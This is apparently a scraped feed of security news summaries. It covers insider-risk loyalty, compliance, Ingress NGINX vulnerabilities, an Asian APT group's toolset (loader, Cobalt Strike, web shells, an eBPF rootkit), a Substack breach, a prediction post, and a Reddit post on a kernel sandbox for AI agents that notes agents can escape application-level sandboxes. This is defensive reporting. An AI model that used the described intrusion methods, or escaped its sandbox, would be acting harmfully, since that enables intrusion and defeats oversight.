    "title": "The blind spot every CISO must see: Loyalty",
    "summary": "The longstanding assumption that tenure, performance metrics, or expressed commitment serve as reliable indicators of the trustworthiness of an employee persists across many sectors. Indeed, the great majority of personnel are loyal. But, while small, the percentage of those who aren’t is still well above zero. Moreover, this conflation of loyalty and security overlooks a fundamental reality: Loyalty is not a static trait, but a dynamic human response shaped by perceived fairness, personal circumstances, and organizational alignment. When grievances go unaddressed or external pressures mount, what appears as steadfast allegiance can quietly shift toward disaffection, resentment, or deliberate breaking of trust. A half-century of observed patterns In my more than 50 years of government, private sector, and journalistic endeavors, I have seen this pattern play out repeatedly. What begins as genuine commitment can erode under the weight of unmet expectations, financial strain, ideological differences, outside influences, or simply the passage of time in roles that demand constant vigilance. The insider who once seemed beyond reproach becomes the very vector through which sensitive data, intellectual property, or operational integrity is compromised. These are not isolated failures of vetting or technology; they are failures to recognize that loyalty is relational and conditional, not absolute. How the misread appears in practice Recent examples illustrate the point. In the US federal sphere, abrupt terminations under workforce reduction initiatives have left former employees with lingering access to sensitive systems, amplifying the potential for data exposure or retaliation . Corporate cases show a similar dynamic: engineers or executives who have spent years building institutional knowledge suddenly depart with proprietary information, motivated not by espionage but by opportunity or resentment. These incidents are not anomalies. They reflect a broader pattern in which subjective judgments of loyalty, what I have come to call “personal barometers,” exist. For example, colleague to colleague, “Janet loves this company, she’s been here 20 years” may be a consensus view, yet it is not accompanied by objective, consistent, and transparent measures. Personnel history blind spots Organizations have long operated under the belief that loyalty, once demonstrated, becomes a durable shield against insider risk. Extended tenure is rewarded with escalating access privileges, high performers are granted broader system rights without commensurate behavioral review, and verbal affirmations of commitment are taken at face value. Yet time and again patterns repeat. What begins as mutual confidence weakens not through dramatic betrayal but through subtle realignments in personal commitment. An employee who once identified strongly with the mission may begin to feel undervalued, overlooked for advancement, or weighed down by outside pressures. The organization, relying on its subjective gauge of past performance, fails to notice the change until the cow has bolted from the barn. These patterns are neither new nor rare. They reflect a systemic reluctance to treat loyalty as a living relationship that requires active maintenance and verification. The blind spot becomes visible Today we have a confluence of forces that will expose the limitations of assumptive loyalty models. Economic volatility, including persistent inflation, ongoing AI-driven job displacements, and workforce reductions, will heighten personal and professional stressors for employees at every level . Compounding the human element is the rapid emergence of AI agents as autonomous insiders . These systems, granted privileged access to sensitive data and decision-making workflows, introduce risks at machine speed: prompt misdirection, goal misalignment, or unintended exfiltration without human intent or oversight. We know AI agents are among the fastest-growing insider vectors, with autonomous capabilities outpacing traditional controls. Geopolitical tensions further amplify the threat. Nation-state actors and proxies increasingly exploit economic pressures and ideological divides to groom or coerce individuals, blurring the lines between personal discontent and hostile external influence. In critical sectors (transportation, finance, medical, energy) where elevated roles already receive greater scrutiny, the model proves resilient. Yet in less regulated environments, the absence of universal, consensual standards leaves organizations exposed. What was once a subtle misalignment becomes systemic exposure when human volatility meets machine autonomy and geopolitical opportunism. Parallels to AI poisoning and the dual crisis of trust These themes extend directly from an earlier column of mine, “ AI poisoning and the CISO’s crisis of trust .” That discussion examined how poisoned training data undermines the foundational integrity of artificial intelligence systems, creating a crisis of confidence in the tools organizations increasingly depend upon. The parallel to human loyalty is clear: Just as corrupted inputs erode the reliability of AI outputs, unexamined or misread human loyalties erode the reliability of the individuals who design, operate, protect, and rely on those systems. In both domains, reactive remediation is insufficient. Trust must be rebuilt through deliberate, continuous verification rather than periodic assumptions. The CISO’s crisis of trust is therefore dual: architectural in the machine domain and relational in the human domain. Coherence across these domains , ensuring that human and machine behaviors remain aligned with organizational intent, then emerges as the essential principle for long-term resilience. The path forward The path forward lies in embracing consensual, tiered verification, where elevated responsibility demands greater scrutiny. Positions with access to crown jewels — sensitive data, financial systems, or personnel records — or executive ranks inherently require proportionately more oversight, as regulated sectors have shown. Professionals in these roles accept this as part of the terrain, with history demonstrating minimal talent loss when frameworks are transparent and supportive. Federal Trusted Workforce 2.0 provides a vital blueprint for the private sector. By 2026, with full implementation across government agencies, this program enrolls millions in continuous vetting, using automated record checks to review a plethora of risks in real-time and reducing reliance on periodic reviews. Private adaptations are feasible and essential: secure releases from key personnel for ongoing monitoring, mirroring TW 2.0’s supportive ethos without federal mandates. These measures are far less expensive than the multimillion-dollar costs of a single malicious insider event ($4.9M to $13.9M per incident per IBM/Mimecast 2025 analyses). Broader practices include pulse surveys and engagement tools to surface misalignment early, integrated HR reviews, and wellness interventions. Gartner indicates AI-integrated behavioral programs reduce employee-driven incidents by 40%. These investments are economical, scalable, and consensual, fostering mutual trust. The folly of equating loyalty with security must end. Through verifiable, human-centric vigilance, including consensual scrutiny scaled to responsibility, organizations can earn trust, not assume it, transforming vulnerabilities into resilience. In the era of zero trust , there should be no pushback in the adoption of “trust but verify” personnel policies.

    "title": "Cybersicherheitsvorschriften: So erfüllen Sie Ihre Compliance-Anforderungen",
    "summary": "Mit der Zunahme von Cyberbedrohungen steigt auch die Zahl der Compliance-Rahmenwerke. So können CISOs diese Herausforderung bewältigen. Foto: Dapitart – shutterstock.com Die Anforderungen von Cybersicherheitsvorschriften können je nach Unternehmensgröße, Region, Branche, Datensensibilität und Programmreifegrad sehr unterschiedlich sein. Ein börsennotiertes Unternehmen hat beispielsweise keine andere Wahl, als mehrere Vorschriften einzuhalten sowie Risikobewertungen und Pläne für Abhilfemaßnahmen zu erstellen. Regierungsbehörden oder Unternehmen, die an Regierungsbehörden verkaufen, müssen bestimmte Compliance-Anforderungen des öffentlichen Sektors erfüllen. Banken, Organisationen des Gesundheitswesens, Infrastrukturunternehmen, E-Commerce-Firmen und andere Unternehmen haben jeweils eigene branchenspezifische Compliance-Regeln zu befolgen. Lesetipp: Sind Sie bereit fürs neue Kreditkarten-Regelwerk? Sicherheit ist nicht gleich Compliance Auch für Unternehmen, die nicht in eine dieser Kategorien fallen, kann es Gründe geben, warum sie bewährte Sicherheitspraktiken nachweisen müssen, zum Beispiel, wenn sie eine SOC-Zertifizierung anstreben oder eine Cyberversicherung beantragen. Umfassende Rahmenwerke für die Einhaltung von Cybersicherheitsvorschriften wie NIS-2 und ISO bieten allen Unternehmen Leitlinien, die sie befolgen können, sowie Strukturen für die Kommunikation der Ergebnisse. Aber: Nur, weil man die Vorschriften einhält, heißt das noch lange nicht, dass man auch sicher ist. Erfahrene Sicherheitsexperten betrachten die Einhaltung von Vorschriften als das absolute Minimum und gehen in ihren Empfehlungen weit über die erforderlichen Komponenten zum Schutz ihrer Unternehmen hinaus. Einhaltung der Vorschriften als Voraussetzung für Geschäftstätigkeit Ein Sicherheitsmanager kann zwar Investitionen und Praktiken für die Cybersicherheit empfehlen, um die Compliance-Anforderungen zu erfüllen, aber er ist nicht der letzte Entscheidungsträger. Eine wichtige Aufgabe des CISO besteht daher darin, das Risiko der Nichteinhaltung von Vorschriften zu kommunizieren und gemeinsam mit anderen Unternehmensleitern zu entscheiden, welche Initiativen Vorrang haben sollen. Das Risiko umfasst in diesem Zusammenhang nicht nur das technische, sondern auch das Geschäftsrisiko. Um Reibungsverluste zu vermeiden, ist es daher sinnvoll, den Mitarbeitern auch den geschäftlichen Nutzen einer konformen Cybersicherheit aufzuzeigen. Kosten-Nutzen-Abwägung Die Unternehmensführung muss dabei die Kosten und den Nutzen der Einhaltung von Vorschriften gegen die potenziellen Kosten der Nichteinhaltung abwägen. Angenommen ein Unternehmen erfüllt eine Best Practice für die Verwaltung von Berechtigungen nicht vollständig: Bei Nichteinhaltung der Vorschriften können die zugrunde liegenden Schwachstellen neben möglichen Klagen von Anteilseignern noch größere Auswirkungen auf das Unternehmen haben, einschließlich Ausfallzeiten, Ransomware-Zahlungen und Umsatzeinbußen. Die Erfüllung der Compliance-Anforderungen könnte hingegen einen geschäftlichen Nutzen bringen, beispielsweise durch schnellere Verkäufe, stärkere Partnerschaften oder niedrigere Cyberversicherungsraten. Wie CISOs Compliance-Rahmenwerke nutzen können CISOs können vorhandene Compliance-Frameworks als Methodik für Techniken und Prozesse verwenden, um sie in ihr Cybersicherheitsprogramm einzubauen. Zu ihren Aufgaben gehört es im Wesentlichen, über die Programmprioritäten zu informieren und eine “Einkaufsliste” für Lösungen zu erstellen, die sie unbedingt benötigen und die mit dem Programm, das sie aufbauen wollen, übereinstimmen. Aber es gibt auch einen Unterschied zwischen der Verwendung eines Compliance-Rahmenwerkes zur Steuerung eines fundierten Risikomanagements und der exakten Einhaltung von Vorschriften. Hier gilt es einen Balanceakt zu meistern und fallweise auch risikobasierte Entscheidungen zu treffen. CISOs brauchen Partner bei der Einhaltung von Vorschriften CISOs sitzen bei der Einhaltung von Vorschriften nicht allein im Boot. Sie müssen Partnerschaften mit Rechtsteams, Datenschutzbeauftragten und Prüfungs- oder Risikoausschüssen aufbauen, um die sich ändernden Compliance-Anforderungen zu verstehen und zu entscheiden, wie sie zu erfüllen sind. Manchmal verlangen diese internen Partner von den Sicherheitsteams, dass sie stärkere Kontrollen einführen, aber sie können auch auf die Bremse treten. So würden manche CISOs gerne das Verhalten ihrer Mitarbeiter detailliert überwachen, aber die Datenschutzgesetze verbieten dies und die Rechtsabteilung sorgt dafür, dass diese Gesetze eingehalten werden. Compliance-Teams erledigen viele Dinge für die Sicherheitsingenieure und -analysten, die weder die Zeit noch die Ressourcen dafür haben. Sie nehmen die Sicherheit in die Pflicht und überprüfen, ob die Kontrollen wie erwartet funktionieren. Sie fungieren quasi als Vermittler zwischen Sicherheitsteams, Aufsichtsbehörden und Prüfern, um die Einhaltung der Vorschriften nachzuweisen, sei es durch das Sammeln von Beweisen mittels manueller Sicherheitsfragebögen oder durch Technologieintegrationen. Für eine Zertifizierung im öffentlichen Sektor müssen beispielsweise die Sicherheitskontrollen überwacht, protokolliert und die Daten mindestens sechs Monate lang aufbewahrt werden, um nachzuweisen, dass alle Vorgaben erfüllt wurden. Lesetipp: Wie internationale Security Frameworks CISOs unterstützen Tools und Ressourcen zur Unterstützung der Einhaltung von Vorschriften Risikoregister sind hilfreich, um alle Beteiligten an einen Tisch zu bringen, indem sie alle Risiken dokumentieren und nach Prioritäten ordnen. Wenn alle Beteiligten die gleichen Informationen einsehen, können sie sich auf geeignete Maßnahmen einigen. Im Rahmen eines Risikomanagementprogramms werden Richtlinien, Standards und Verfahren regelmäßig überprüft und alle Änderungen vor ihrer Umsetzung genehmigt. Mithilfe von Tools wie Governance, Risk, and Compliance (GRC)-Systemen und kontinuierlicher Überwachung der Einhaltung von Vorschriften wie NIS-2 und ISO können Unternehmen laufende Sicherheitsaktivitäten verfolgen und die Ergebnisse melden. GRC-Systeme lassen sich mit SIEM -Lösungen verknüpfen, um Protokolle zu sammeln, durch die Kombination mit Schwachstellen-Scannern kann man nachzuweisen, dass Prüfungen durchgeführt wurden. Zusätzlich zu solchen Instrumenten verlassen sich viele Unternehmen auf Dritte, um die Einhaltung der Vorschriften zu bewerten. Diese können vor einer externen Prüfung ein internes Compliance-Audit durchführen, um sicherzustellen, dass es keine Überraschungen gibt, wenn die Aufsichtsbehörden vorbeikommen. Einmal erfüllen, auf viele anwenden Die meisten Unternehmen haben zahlreiche Compliance-Stellen, denen sie Rechenschaft ablegen müssen, sowie Cyberversicherungsanbieter, Kunden und Partner. Die Einhaltung von Vorschriften kann zwar eine Belastung sein, aber es gibt Techniken, um den Bewertungsprozess zu rationalisieren. Immerhin ist ein Großteil der gesetzlichen Anforderungen beinahe identisch. Orientieren sich CISOs beispielsweise an einem Rahmenwerk wie NIST, können sie überall die gleichen Verfahren anwenden. So sind zum Beispiel Anforderungen an das Privileged Access Management (PAM) wie Passwortmanagement, Multi-Faktor-Authentifizierung (MFA) und rollenbasierte Zugriffskontrollen in allen Compliance-Frameworks zu finden. Ausblick Letztlich ist die Einhaltung von Vorschriften ein fließender Bereich mit Anforderungen, die sich weiterentwickeln, um den sich ändernden Risikomustern und Geschäftsbedingungen Rechnung zu tragen. Es ist zu erwarten, dass die Sicherstellung der Compliance in Zukunft einen noch größeren Teil der Arbeit von CISOs ausmachen wird. Da die Branche mit immer größeren Bedrohungen konfrontiert ist, ist die Einhaltung von Vorschriften ein wichtiger Bestandteil eines strategischen und umfassenden Ansatzes für das Management von Cybersicherheitsrisiken.

    "title": "Four new vulnerabilities found in Ingress NGINX",
    "summary": "Four security vulnerabilities have been found in the open source Ingress NGINX traffic controller that is extensively used by organizations in Kubernetes deployments. They can only be fixed by upgrading to the latest version. Of the four holes, two are more serious, because they carry CVSS scores of 8.8: CVE-2026-1580 is an improper input validation issue. If the Ingress NGINX controller is configured with a default custom-errors configuration that includes HTTP errors 401 or 403, and if the configured default custom-errors backend is defective and fails to respect the X-Code HTTP header, then an Ingress with the auth-url annotation may be accessed even when authentication fails. CVE-2026-24512 is a configuration injection vulnerability where the rules.http.paths.path Ingress field can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of secrets accessible to the controller. “This is a serious vulnerability,” commented Kellman Meghu, CTO of Canada’s DeepCove Cybersecurity, who has experience with Ingress NGINX. “If I could exploit it, I could get the Ingress gateway to create a path directly to internal resources. It’s like opening the insides that should never be exposed. Will that lead to further exposure or hacks? Probably, but in terms of impact, it’s a first step to gain access into the environment, and from there it could go further, the least of which would be disruption of services.” NGINX is a reverse proxy/load balancer that generally acts as the front-end web traffic receiver and directs it to the application service for data transformation. Ingress NGINX is a version used in Kubernetes as the controller for traffic coming into the infrastructure. It takes care of mapping traffic to pods of containers running jobs without exposing the pods themselves. Meghu says Ingress NGINX is the primary traffic entry point, and is effective due to its ability to reload its configuration on the fly, allowing it to adjust to changes inside a Kubernetes cluster. These vulnerabilities only affect Ingress NGINX versions 1.13.7 and below, and 1.14.3 and below, if they are installed on a Kubernetes cluster. The warning comes just weeks before, as announced at KubeCon in November, support for Ingress NGINX ends . Starting in March, the project will no longer receive active maintenance, security patches, or bug fixes. Experts have been urging Kubernetes administrators to shift to a new controller ever since. They recommend Kubernetes Gateway API as the standard for traffic management. Meghu notes it is vendor neutral and widely used. Other options are controllers such as Cilium Ingress, Traefik, or HAProxy Ingress. In addition to CVE-2026-24512, the other new vulnerabilities are CVE-2026-24513 , considered by Meghu a low risk since an attacker needs to have a config containing specific errors to exploit, and CVE-2026-24514 , which Meghu considers a medium risk. The controller could be subject to a denial of service if an attacker overwhelms it with requests. These are just the most recent issues with Ingress NGINX. Just over a year ago, researchers at Wiz discovered a group of holes dubbed IngressNightmar e. They can allow unauthenticated users to inject malicious NGINX configurations and execute malicious code into the Ingress NGINX pod, potentially exposing all cluster secrets and leading to cluster takeover. Satnam Narang, senior staff research engineer at Tenable, told CSO that he considers the new holes less concerning than IngressNightmare, which he called a “toxic combination” that could result in cluster takeover. “While there’s nothing novel about [the new vulnerabilities], they serve as a stark reminder to all admins that if they haven’t started migrating, they need to start immediately, before Ingres NGINX is retired next month. Given its upcoming retirement, migration is the best strategy to mitigate these vulnerabilities.”",

    "title": "3 common SaaS Management challenges and how to avoid them",
    "summary": "The return on your SaaS management platform investment is very dependent on the quality of your rollout. ‍ You’ve seen the demo that shows how a SaaS management platform like 1Password SaaS Manager can give your team data on the budget you’re wasting on unused SaaS licenses for Salesforce, Zoom, GitHub etc. Perhaps you played around with a workflow builder in a demo environment and defined automations for reviewing shadow IT or reclaiming unused licenses. In short, you’re seeing a solid business case for SaaS management that brings together immediate, direct cost savings with the promise of ongoing efficiency gains from the automation of IT ops. Does that mean it’s time to sign-up, turn on the new SaaS management platform, sit back and reap the SaaS optimization rewards? Unfortunately, without the right foundations, early rollout mistakes can weaken your SaaS management program, making it harder to govern access and control risk over time. Here are the 3 most common challenges we’ve seen companies face in rolling out SaaS Management Platforms, and our tips on how to avoid them. Challenge #1: automation expectation vs. reality SaaS Management requires API access to your key business apps. This is one of the most common SaaS integration challenges teams face during implementation. For instance, imagine you’re using Zoom within your business. Great news – Zoom has a fantastic API which shares a user list along with the roles, license plan (enterprise, pro, basic) and date of last login for every user. Their API also shares activity metrics such as the number of ‘pro’ meetings each user is holding. Zoom’s API also supports user management, allowing you to downgrade or de-provision those unused licenses via an automation setup in your new SaaS management platform. In short, this provides all the information you need to identify unused licenses and the corresponding wasted SaaS spend. If every SaaS app had an API like Zoom’s, life in the IT team would be great. In reality, we find that around 30-40% of apps have an API with user-related endpoints. Of these apps, around half of the APIs will have broad functionality for user activity metrics and user management. To make things more complicated, some apps only offer API availability – or access to specific endpoints – if you’re on a premium plan. Additionally, availability of APIs is skewed towards the more popular apps. It’s nuanced, to say the least, but you’re likely never going to get full coverage for your SaaS inventory. This doesn’t mean you can’t get value from your SaaS management initiative, but it does mean you need to level your expectations and formulate a plan to get useful information for key apps that lack an API. Being aware of any SaaS integration challenges early helps teams set realistic expectations and avoid stalled automations. Perhaps most importantly, you need clarity from your SaaS management vendor on the API availability and quality for your core SaaS inventory. For instance, 1Password SaaS Manager has over 350 direct API integrations with different SaaS tools, with clear guidance on the core capabilities of each integration. Our recommendations Don’t assume that what you’ve seen demonstrated for one application applies to all. Ask your SaaS management vendor for details about the apps that are important to you Take a pragmatic approach to managing apps without APIs (or APIs you can’t access on your current plan). Focus on high spend apps that have a per-user licensing model Establish a plan with your SaaS management vendor to account for any key API-less apps. If you need the user data, it’s invariably going to require some manual intervention, and you will want functionality in place to make that as painless as possible Challenge #2: getting buy-in beyond the IT team Tracking usage carefully lets you identify opportunities for SaaS license optimization, cutting waste while making sure teams have the tools they need. To achieve this, IT and security teams will need input from the wider business to gather all the license details for your SaaS inventory, such as: start and renewal dates, what plans you’re on, and the rates you’ve negotiated. Even if the SaaS management vendor is going to enter the license details for you, someone in your business may still need to be tracked down to provide missing details. Overall, this process is likely to involve pulling together dozens of SaaS contracts and order forms that have been squirreled away in PDFs all across your business. You shouldn’t assume that your Head of Sales is in a rush to rummage through the virtual filing cabinet to find the most recent Salesforce contract. Unfortunately, APIs won’t magically solve this problem. At best, you might get overall license entitlements from an app’s API, but it’s surprisingly uncommon. Certain critical details around the license structure – such as your negotiated rates or the renewal date – may not be available via an API. Magic AI, ML, or OCR extraction tools aren’t going to come to the rescue either. Order forms, contracts, and MSAs come in wildly different and often byzantine formulations. Extracting that unstructured data from a PDF and translating it into something useful is not going to produce reliable results at scale. If you’re one of the lucky few with a nicely organized spreadsheet of SaaS license data, or you’re cutting over from an existing SAM or SaaS management tool, the initial setup is significantly streamlined. Overall, however, getting hold of this license information is a very common, early challenge in the rollout of a SaaS management platform. It’s not all doom and gloom, though. The solution comes down to collaborating with other teams in the business, and having an understanding of the existing systems and processes that you can tap into. Preparing for this challenge is all about having a realistic take on your current situation and an understanding of what’s possible. Our recommendations There’s typically a number of core SaaS apps that the IT team manages directly. Consider starting with these apps so you get to experience firsthand the kind of license information you need and where you’re likely to find it Establish which teams and systems are currently involved in the onboarding, renewing and modifying of SaaS agreements. Wherever possible, align with these existing processes to avoid duplicate data entry Look for opportunities to integrate with other systems handling SaaS vendor information in the business e.g. contract management, procure-to-pay, ERP Consider the messaging when asking for input from the wider business. Make sure you’re introducing your new SaaS management platform and providing context for the request Encourage company-wide engagement by leveraging an executive sponsor in your messaging Challenge #3: establishing process, not patches Now that you’ve invested in putting a SaaS management platform in place, you’re probably going to uncover some ‘shadow IT’ surprises, such as spending on SaaS apps you weren’t aware were even in use, non-SSO applications, or users granting risky access permissions to personal-use browser extensions. These discoveries often signal deeper SaaS sprawl challenges across the organization. Strong SaaS security posture management depends on having repeatable processes to manage discovery, access, and ongoing change. If you’ve not engaged in this kind of SaaS discovery before, you’re going to be playing catch-up. It takes time to work through this information and to make decisions on how to respond. This is also where SaaS security challenges start to emerge, especially as access and usage expand faster than governance. 1Password SaaS Manager offers automated discovery and management for unapproved SaaS and AI apps, which can help greatly. Nonetheless, it's worth remembering that this process is ongoing, and you’ll need to support the evolution and growth of your SaaS ecosystem; as you go through the pain of reviewing this first big wave of discovered apps, more apps will still be arriving in your inbox for review. It’s an opportunity to formulate policies and standardized responses, but at the same time you might feel overwhelmed by the short-term workload. This also applies to your SaaS license details, which are subject to regular change. Without clearly defined processes and responsibilities, your license information is going to become outdated as agreements get modified or renewed. The temptation is to make a concerted, tactical push to work through the initial system implementation while failing to consider the long-term plan for the maintenance and expansion of your SaaS management platform. Our recommendations Establish clearly articulated policies for Shadow IT. Do you mind if users are accessing personal use apps / websites with their work credentials? Make sure your SaaS management platform has workflow automation functionality to automatically apply your policies wherever possible Assign a point of contact in your IT team to support your application owners. Policies and workflows will need to be continually reviewed and modified. Similarly, someone needs to check that people are keeping license information up to date In summary Addressing SaaS security challenges alongside cost and operational concerns is important, but getting SaaS management right isn’t as simple as finding a SaaS management vendor and switching their platform on. It’s critical to ensure that your rollout addresses your key SaaS security challenges, as well as cost and operational concerns. Aligning your expectations, understanding what’s possible given your SaaS application stack, and getting buy-in outside of the IT team are all critical to getting long-term business value from your SaaS management platform and, more importantly, your SaaS applications. Failing to plan for SaaS sprawl challenges makes long-term governance much harder. Want to learn more about rolling out 1Password SaaS Manager? Schedule a demo.",

    "title": "New APT group breached gov and critical infrastructure orgs in 37 countries",
    "summary": "A new cyberespionage group that operates out of Asia has compromised 70 government and critical infrastructure organizations across 37 countries over the past year using a sophisticated toolset that combines phishing, exploitation kits, custom malware, Linux rootkits, web shells, and a variety of other tunneling and proxy tools. Researchers believe the group is expanding its activities and is conducting active reconnaissance on even more targets. “Between November and December 2025, we observed the group conducting active reconnaissance against government infrastructure associated with 155 countries,” researchers from security firm Palo Alto Networks said in a new report . Palo Alto tracks the group as TGR-STA-1030 (aka UNC6619) and believes it is based in Asia based on language settings, its preference for regional tooling, GMT+8 operating hours, and targeting that aligns with events in the region. The researchers, who have been tracking the group since February 2025, believe it has ties to a nation state. The group’s confirmed victims include national-level law enforcement and border control entities; ministries and departments of interior, foreign affairs, finance, trade, economy, immigration, mining, justice, and energy; elected officials and even a parliament’s infrastructure. The group has also targeted national telecommunications companies. “While this group might be pursuing espionage objectives, its methods, targets, and scale of operations are alarming, with potential long-term consequences for national security and key services,” Palo Alto’s researchers said. From phishing to exploits Palo Alto started tracking the group a year ago following a series of phishing campaigns directed at European governments that the company dubbed the Shadow Campaigns. The phishing emails posed as announcements about organizational changes in official institutions and were written in the language of their intended targets. The messages contained links that led to the download of a ZIP archive with a custom malware loader the researchers now call Diaoyu. This loader performs various checks to detect the presence of certain antivirus programs and to ascertain whether it is running in a sandbox. It then proceeds to download the Cobalt Strike implant from a GitHub repository. Cobalt Strike is a commercial penetration testing tool that has grown popular among attackers over the years. Although the group hasn’t been observed exploiting previously unknown vulnerabilities to gain access to networks, it has used exploits for known vulnerabilities (N-days) in a large number of software products, operating systems, and libraries, including: SAP Solution Manager, Microsoft Open Management Infrastructure, Microsoft Exchange Server, Pivotal Spring Data Commons, Struts2, Eyou Email System, Beijing Grandview Century eHR Software, Weaver Ecology-OA, Commvault CommCell CVSearchService, Zhiyuan OA, Microsoft Windows, networking products from Ruijieyi Networks and D-Link, and more. “On one occasion, we observed the actor connecting to e-passport and e-visa services associated with a ministry of foreign affairs,” the researchers said. “Because the server for these services was configured with Atlassian Crowd software, the actor attempted to exploit CVE-2019-11580, uploading a payload named rce.jar.” A complex toolset of implants In addition to Cobalt Strike, the group uses various other malware payloads and command-and-control (C2) frameworks, including VShell, Havoc, SparkRat, and Sliver. On compromised web servers, the attackers deploy a variety of web shells, including Behinder, Neo-reGeorg, and Godzilla. On Linux servers the group has been seen deploying a rootkit dubbed ShadowGuard, which leverages the Extended Berkeley Packet Filter (eBPF), a powerful feature for running sandboxed code inside the Linux kernel. “eBPF backdoors are notoriously difficult to detect because they operate entirely within the highly trusted kernel space,” the researchers said. “eBPF programs do not appear as separate modules. Instead, they execute inside the kernel’s BPF virtual machine, making them inherently stealthy. This allows them to manipulate core system functions and audit logs before security tools or system monitoring applications can see the true data.” ShadowGuard appears to be a tool that’s unique to this group and allows them to hide processes, files, and directories. To conceal outgoing network traffic from victim networks, the attackers use a variety of relay and proxy servers running tunneling software like the GO Simple Tunnel (GOST), Fast Reverse Proxy Server (FRPS), and IOX, but their C2 servers are typically hosted on virtual private servers (VPS) from the US, UK, and Singapore. Increase in targeting Palo Alto believes the group is expanding its operations because it has scanned networks of organizations from 155 countries for known vulnerabilities since October. The scans appear to be targeted on IP addresses belonging to government infrastructure and specific targets of interest. For example, during the US government shutdown that began in October , the group started scanning the infrastructure of governments in the Americas, including in Brazil, Canada, Dominican Republic, Guatemala, Honduras, Jamaica, Mexico, Panama, and Trinidad and Tobago. The researchers believe the group has already compromised entities in Bolivia, Brazil, Mexico, Panama, and Venezuela. The group seems to time its targeting to certain events. For example, when the president of Czechia met with the Dalai Lama in August, the group immediately started scanning the computer infrastructure belonging to the Czech Army, police, parliament, and presidency, as well as its ministries of interior, finance, and foreign affairs. “TGR-STA-1030 remains an active threat to government and critical infrastructure worldwide,” Palo Alto said. “The group primarily targets government ministries and departments for espionage purposes. We assess that it prioritizes efforts against countries that have established or are exploring certain economic partnerships.” The company’s report includes indicators of compromise, including IP addresses, domain names, and file hashes for the implants used by the group.",

Rather than making vague claims, I'm pre-registering a specific prediction with falsifiable criteria. --- ## Methodology: Hash-Based Timestamping I've created a detailed prediction document (Feb 5, 2026) containing: - Specific vulnerability type and affected systems - Probability distribution across cloud providers - Technical markers (specific attack vector terminology) - Validation criteria (CVE disclosures, security advisories, media reports) - Exact date range: **February 12-18, 2026** To prevent observer effects and maintain integrity, I'm publishing only the SHA-256 hash: ``` [8f42594c6b0a4155d144fe3c1643ee72775f7017a926a8ba6151703f7700d15f] ``` --- ## Prediction Domain **Scope:** Authentication/identity verification systems **Window:** Feb 12-18, 2026 **Expected Disclosure:** Security advisory, CVE, or media report from major cloud provider or digital asset custodian --- ## Why This Approach? **Problem with traditional predictions:** - Post-hoc editing - Vague enough to fit multiple outcomes - Confirmation bias **Solution:** - SHA-256 hash creates immutable timestamp - Full document revealed Feb 19, 2026 - Anyone can verify: `SHA256(revealed_text) == published_hash` - If hash doesn't match → fraud - If prediction fails → hypothesis falsified --- ## Validation Protocol **During Feb 12-18, I will monitor:** - CVE Database - Cloud provider security bulletins (Azure, AWS, GCP) - HackerNews, BleepingComputer, Krebs on Security - Vendor security advisories **Feb 19: Full Disclosure** - Complete prediction document published - Hash verification - Event analysis (hit/miss/partial) --- ## Call for Independent Verification If you're interested in scientific rigor: Archive this post (with timestamp) Monitor your usual security sources Feb 12-18 Document anything unusual in authentication/identity space Verify hash on Feb 19 This is **not** a claim of magic or insider knowledge. It's a **falsifiable test** of pattern recognition in complex systems. If the prediction is wrong, I will clearly state that.

    "title": "Substack data breach leaks users’ email addresses and phone numbers",
    "summary": "Substack, a high-profile publishing platform widely used by academics, journalists, subject matter experts, and controversialists, has suffered a data breach affecting an unknown number of its creators and subscribers. According to emails sent out this week to some users, on February 3 the company “identified evidence” that a third party had exploited an unspecified weakness in the company’s systems to gain access to user email addresses, phone numbers and, more vaguely, “other internal metadata.” The breach happened in October 2025, which means that data, which the company said did not include credit card numbers, passwords, or financial information, has been exposed for up to four months. “We have fixed the problem with our system that allowed this to happen. We are conducting a full investigation, and are taking steps to improve our systems and processes to prevent this type of issue from happening in the future,” said the email from Substack CEO Chris Best. “We do not have evidence that this information is being misused, but we encourage you to take extra caution with any emails you receive that may be suspicious.” No passwords to lose At the time of publication, Substack had not yet made a web announcement about the breach, limiting itself to sending emails to users. This implies that the breach only affects a subset of its estimated 35 million active users. Indeed, the language of the email alert downplays the incident, describing the exposed data as merely being “shared without your permission.” However, the fact that the breach was only discovered this week, after a four-month delay, raises the possibility that its scope could yet grow as Substack conducts deeper forensics. A dark web source claimed the breach compromised 697,313 records, although this remains unconfirmed. It also reported that IDs from payment system Stripe, used by creators to receive payment from their subscribers, were compromised. Based on the wording of the email alert sent by the company, the breach only affects users who have Substack accounts; anyone who subscribes to a Substack creator’s newsletter directly using an email address shouldn’t be affected. The full extent of what was exposed is less clear. In addition to email addresses and phone numbers, the company mentioned “metadata,” a catch-all term. In its privacy policy , Substack describes a wide range of data this might include, depending on how the site is used, including user IDs, profile pictures, biographies, and IP addresses. How should Substack users react? Normally, the advice after any data breach is to change the account password. However, Substack’s default access method is via email address , with authentication confirmed by sending a “magic link” to the user’s email address. This removes the problem of password compromise and phishing attacks by not having a password to phish. If optional multi-factor authentication is turned on, the user must additionally enter a onetime code from an app. Passwords are still possible — users who signed up before 2023 might have one — but in 2026, the user must actively choose to create one. The company doesn’t mention whether this subset of users should consider changing their passwords as a precaution, but did offer the following statement: “We cannot share specifics about our security systems and processes, but we can confirm that the issue has been resolved and safeguards have been put in place to help prevent this issue from happening again.” Substack’s only other known security incident happened in 2020 when it accidentally exposed user email addresses by adding them to the “cc” (carbon copy) field instead of the “bcc” (blind carbon copy) of an email when sending out a policy update.",

Application-level sandboxes can be bypassed by the code they're sandboxing. I have been around security for a long old time now (i started something called sigstore a few years back) and have seen this pattern so many times before. Here's it nailing down OpenClaw in just a couple of mins. Linux: Landlock LSM (kernel 5.13+) macOS: Seatbelt (sandbox_init) After sandbox + exec(), there's no syscall to expand permissions. The kernel says no. What it does: nono run --read ./src --allow ./output -- cargo build nono run --profile claude-code -- claude nono run --allow . --net-block -- npm install nono run --secrets api_key -- ./my-agent Filesystem: read/write/allow per directory or file Network: block entirely (per-host filtering planned) Secrets: loads from macOS Keychain / Linux Secret Service, injects as env vars, zeroizes after exec Technical details: Written in Rust. ~2k LOC. Uses the landlock crate on Linux, raw FFI to sandbox_init() on macOS. Secrets via keyring crate. All paths canonicalized at grant time to prevent symlink escapes. Landlock ABI v4+ gives us TCP port filtering. Older kernels fall back to full network allow/deny. macOS Seatbelt profiles are generated dynamically as Scheme-like DSL strings. Would love any feedback from you pros, if you have any. submitted by /u/DecodeBytes [link] [comments]",

    "title": "General Availability of Microsoft Purview eDiscovery Graph API for E3 Customers",
